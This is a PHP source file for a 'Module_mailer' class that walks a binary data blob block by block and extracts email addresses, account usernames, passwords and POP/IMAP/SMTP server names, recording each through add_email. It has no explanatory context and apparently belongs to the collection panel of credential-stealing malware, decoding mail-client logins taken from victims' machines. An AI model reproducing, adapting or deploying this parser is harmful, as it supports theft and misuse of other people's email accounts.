<?php
//subpt111
class Module_mailer extends Module_
{
	private function GetElement(&$Stream)
	{
		$Result = $Stream->getC_STR(TRUE);
		$Stream->Skip(1);
		return $Result;
	}

	private function ProcessBlock(&$Stream, $CurBlock, &$JMP_)
	{
		$Cnt = 0;
		$Prot = $Email = $POPServer = $SMTPServer = $User = $Pass = 0;
		
		while($Cnt != 8)
		{
			switch($Cnt)
			{
				case 0:
					$Email = $this->GetElement($Stream); //email!!
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$Email .= $this->GetElement($Stream);
						
						$JMP_++;
					}
				break;
				case 1:
					$this->GetElement($Stream); //accname
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$this->GetElement($Stream);
						$JMP_++;
					}
				break;
				case 2:
					$this->GetElement($Stream); //recvmail
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$this->GetElement($Stream);
						$JMP_++;
					}
				break;
				case 3:
					$this->GetElement($Stream); //link
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$this->GetElement($Stream);
						$JMP_++;
					}
				break;
				case 4:
					$User = $this->GetElement($Stream); //user!!
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$User .= $this->GetElement($Stream);
						
						$JMP_++;
					}
				break;
				case 5:
					$Pass = $this->GetElement($Stream); //pass!!
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$Pass .= $this->GetElement($Stream);
						
						$JMP_++;
					}
				break;
				case 6:
					$POPServer = $this->GetElement($Stream); //popserver!!
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$POPServer .= $this->GetElement($Stream);
						
						$JMP_++;
					}
				break;
				case 7:
					$SMTPServer = $this->GetElement($Stream); //smtpserver!!
					if($Stream->GetDataPos() >= $CurBlock + 256 * $JMP_)
					{
						$Stream->Skip(7);
						$SMTPServer .= $this->GetElement($Stream);
						
						$JMP_++;
					}
					
					$Stream->GetDWORD(); ///???????????
					$Stream->GetDWORD();
					$Prot = $Stream->GetDWORD(); //prot imap/pop
				break;
			}
			
			$Cnt++;
		}
		
		if($Prot == 1)
			$this->add_email($Email, 'imap', $POPServer, 0, $User, $Pass); //NUP
		else
			$this->add_email($Email, 'pop3', $POPServer, 0, $User, $Pass);
		
		$this->add_email($Email, 'smtp', $SMTPServer, 0, $User, $Pass);
	}

	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$stream = new Stream($Data);
			
			$stream->getWORD();
			$stream->getBYTE();
			$stream->getBYTE();
			$Blocks = $stream->getDWORD();

			$CurPos = 256;
			while($CurPos < 256 * $Blocks+1)
			{
				$JMP_ = 1;
				$stream->SetPos($CurPos);
				$CurBLockPos = $stream->GetDataPos();
				if($stream->getWORD() == 1)
				{
					$stream->getBYTE();
					if($stream->getBYTE() == 25)
					{
						$stream->getDWORD();
						$this->ProcessBlock($stream, $CurBLockPos, $JMP_);
					}
				}
				
				$CurPos += 256 * $JMP_;
			}
			
			$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
